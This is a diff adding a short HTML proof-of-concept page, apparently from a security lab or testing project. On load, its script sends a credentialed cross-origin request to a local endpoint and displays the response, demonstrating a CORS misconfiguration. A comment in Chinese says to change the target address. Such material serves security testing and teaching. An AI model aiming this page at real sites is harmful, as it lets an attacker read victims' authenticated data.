@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>cors poc</title>
+</head>
+<body>
+<script type="text/javascript">
+  function cors() {
+    const xhttp = new XMLHttpRequest();
+    xhttp.onreadystatechange = function () {
+      if (this.status === 200) {
+        alert(this.responseText);
+      }
+    };
+    // 修改为对应的地址
+    xhttp.open("GET", "http://127.0.0.1:8000/home/cors");
+    xhttp.withCredentials = true;
+    xhttp.send();
+  }
+  cors();
+</script>
+</body>
+</html>
